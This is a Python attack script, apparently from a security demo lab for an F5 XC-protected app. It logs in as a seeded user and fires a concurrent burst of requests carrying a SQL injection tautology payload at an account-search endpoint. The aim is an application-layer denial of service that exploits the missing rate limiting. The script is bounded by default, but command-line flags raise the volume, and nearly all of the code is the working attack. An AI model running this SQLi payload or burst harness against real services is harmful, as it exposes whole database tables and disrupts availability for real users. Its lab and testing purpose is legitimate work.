"""
app_dos.py — a bounded burst of concurrent expensive requests to spike load.

Vuln / bot scenario:  There is no rate limit (no limit_req zone) anywhere in the
                      gateway, so a bot can fire a tight burst of expensive
                      requests and drive a visible load spike. The default target
                      is the SQLi-tautology /accounts/search, which makes the DB
                      return the whole table each time — an intentionally
                      expensive request.
F5 XC category:       API Security / Bot Protection: Unthrottled business logic /
                      application-layer DoS.

Deliberately BOUNDED: --requests and --concurrency default to modest values so it
generates a watchable spike on the Ops console WITHOUT wedging a laptop. Raise
them if you want a bigger blip. Every request has a short timeout.

Usage:
    python3 app_dos.py                                 # 200 reqs, concurrency 16
    python3 app_dos.py --requests 500 --concurrency 32
"""

import argparse
import os
import sys
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import (BASE_URL, SEEDED_USERS, auth_headers, login, make_client)

EXPENSIVE_PAYLOAD = "x%' OR '1'='1' -- "  # forces a full-table return each hit


def main():
    ap = argparse.ArgumentParser(description="Bounded application-layer DoS / load-spike bot.")
    ap.add_argument("--requests", type=int, default=200, help="total requests to fire")
    ap.add_argument("--concurrency", type=int, default=16)
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS))
    ap.add_argument("--path", default="/api/accounts/accounts/search",
                    help="endpoint to hammer (default: the expensive SQLi search)")
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}{args.path}")
    print(f"firing {args.requests} requests, concurrency={args.concurrency} "
          f"(bounded — raise the flags for a bigger spike)\n")

    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = auth_headers(token)

        codes = Counter()
        latencies = []

        def one():
            t0 = time.time()
            try:
                r = client.get(args.path, headers=hdrs, params={"q": EXPENSIVE_PAYLOAD})
                code = r.status_code
            except Exception:  # noqa: BLE001
                code = -1
            latencies.append(time.time() - t0)
            return code

        start = time.time()
        with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
            futs = [pool.submit(one) for _ in range(args.requests)]
            for fut in as_completed(futs):
                codes[fut.result()] += 1
        elapsed = time.time() - start

    rps = args.requests / elapsed if elapsed else 0
    avg = sum(latencies) / len(latencies) if latencies else 0
    print("--- report ---")
    print(f"fired:     {args.requests} in {elapsed:.2f}s ({rps:.0f} req/s)")
    print(f"latency:   avg {avg * 1000:.0f}ms, max {max(latencies) * 1000:.0f}ms")
    print(f"status:    {dict(codes)}")
    print("Nothing throttled the burst — watch the spike on the Ops console "
          "(GET /api/admin/admin/traffic).")


if __name__ == "__main__":
    main()
